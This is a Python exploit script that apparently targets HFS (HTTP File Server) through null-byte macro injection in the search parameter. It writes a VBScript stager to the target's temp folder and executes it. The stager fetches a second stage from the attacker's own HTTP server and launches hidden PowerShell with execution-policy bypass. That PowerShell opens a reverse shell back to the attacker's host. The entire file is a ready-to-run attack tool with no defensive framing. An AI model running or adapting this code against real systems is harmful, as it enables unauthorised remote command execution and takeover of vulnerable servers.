#!/usr/bin/env python3

import argparse
import http.server
import random
import socketserver
import string
import threading
import time
import urllib.parse
import requests


def rand_str(n=12):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


class PayloadHandler(http.server.BaseHTTPRequestHandler):
    token_path = "/"
    vbs_payload = ""

    def log_message(self, fmt, *args):
        return

    def do_GET(self):
        if self.path == self.token_path:
            body = self.vbs_payload.encode("utf-8", errors="ignore")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()


def start_http_server(bind_ip, bind_port, token_path, vbs_payload):
    handler = PayloadHandler
    handler.token_path = token_path
    handler.vbs_payload = vbs_payload
    httpd = socketserver.TCPServer((bind_ip, bind_port), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def hfs_send_raw(target, search_value, timeout=8):
    url = f"http://{target}/?search={search_value}"
    return requests.get(url, timeout=timeout)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", required=True, type=int)
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--http-bind", default="0.0.0.0")
    ap.add_argument("--timeout", type=int, default=8)
    args = ap.parse_args()

    temp_vbs = f"{rand_str(14)}.vbs"
    token = rand_str(10)
    token_path = f"/{token}"

    ps = (
        f"$c=New-Object Net.Sockets.TCPClient('{args.lhost}',{args.lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1 | Out-String);"
        f"$r2=$r+'PS '+(pwd).Path+'> ';"
        f"$o=([Text.Encoding]::ASCII).GetBytes($r2);"
        f"$s.Write($o,0,$o.Length);$s.Flush()"
        f"}};$c.Close()"
    )

    vbs_stage2 = (
        'Set s=CreateObject("WScript.Shell")\r\n'
        f's.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""{ps}""",0,False\r\n'
    )

    vbs_stage1 = (
        'Set x=CreateObject("Microsoft.XMLHTTP")\r\n'
        'On Error Resume Next\r\n'
        f'x.Open "GET","http://{args.lhost}:{args.http_port}{token_path}",False\r\n'
        'If Err.Number <> 0 Then\r\n'
        ' WScript.Quit\r\n'
        'End If\r\n'
        'x.Send\r\n'
        'Execute x.responseText\r\n'
    )

    print(f"[+] Starting HTTP server on {args.http_bind}:{args.http_port} serving {token_path}")
    httpd = start_http_server(args.http_bind, args.http_port, token_path, vbs_stage2)

    vbs_stage1_enc = urllib.parse.quote(vbs_stage1, safe="")
    save_macro = f"%00{{.save|%25TEMP%25%5C{temp_vbs}|{vbs_stage1_enc}.}}"
    exec_cmd = f"wscript.exe+%2F%2FB+%2F%2FNOLOGO+%25TEMP%25%5C{temp_vbs}"
    exec_macro = f"%00{{.exec%7C{exec_cmd}.}}"

    try:
        print(f"[+] Writing {temp_vbs} to target")
        hfs_send_raw(args.target, save_macro, timeout=args.timeout)
        time.sleep(0.3)
        print("[+] Executing stager")
        hfs_send_raw(args.target, exec_macro, timeout=args.timeout)
        print("[+] Await reverse shell")
    finally:
        time.sleep(3)
        httpd.shutdown()


if __name__ == "__main__":
    main()
